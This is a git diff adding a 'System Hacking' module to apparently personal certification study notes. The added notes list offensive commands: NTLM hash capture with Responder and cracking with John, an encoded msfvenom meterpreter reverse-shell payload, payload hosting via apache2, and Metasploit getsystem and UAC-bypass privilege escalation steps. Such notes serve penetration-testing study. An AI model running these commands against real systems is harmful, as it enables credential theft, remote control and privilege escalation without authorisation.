@@ -213,4 +213,43 @@ hosts -> now exact os_flavor information has been updated
 >Hit launch from drop-down of save
 
 
+<<<Module 06 - System Hacking>>>
+
+>[!important] File Sharing Between Machines using `apache2` server
+>- mkdir /var/www/html/share
+>- chmod -R 755 /var/www/html/share
+>- chown -R www-data:www-data /var/www/html/share
+>- cp [payload file] /var/www/html/share
+>- service apache2 start
+
+---Responder---
+Extracts OS information, NTLM Password Hashes, NTLM Username, NTLM Ip Address, Client version
+To start Responder:- 
+`responder -I eth0`
+ 
+ - Default location for storing logs - ` /home/responder/logs` pass this log file to JTR to crack the password using the given wordlist.
+ - john `/usr/share/responder/logs/[file name of the logs.txt]`
+
+---Msfvenom Payload ---
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT Number] -f exe  --platform windows -a x86 -e x86/shikata_ga_nai -o [output file ]`
+
+`run vnc` - To get VNC session in meterpreter session (Requires Root Privileges)
+
+>[!check] Multihandler
+>- use exploit/mutli/handler
+>- set payload to what you have defined in msfvenom payload
+>- Transfer the payload and run it
+>- after getting the shell run the following commands:-
+>- getuid
+>- sysinfo
+>- getsystem - check for privilege escaltion / bypass UAC
+>- background sessions using `bg` command or `background`
+https://null-byte.wonderhowto.com/how-to/bypass-uac-escalate-privileges-windows-using-metasploit-0196076/
+>- if getsystem didn't worked use`bypassuac` or `bypassuac_fodhelper` exploit module
+>- set payload to what you have defined in msfvenom payload
+>- Now u will have the root user privileges
+[Ultimate List of Meterpreter Commands](simplenote://note/39167abb-f1fe-4be1-a80b-fff229eabb8c)
+
+`To get all information regarding privilege escalation use WinPEAS/LinPEAS`
+
 #Stay tuned for more
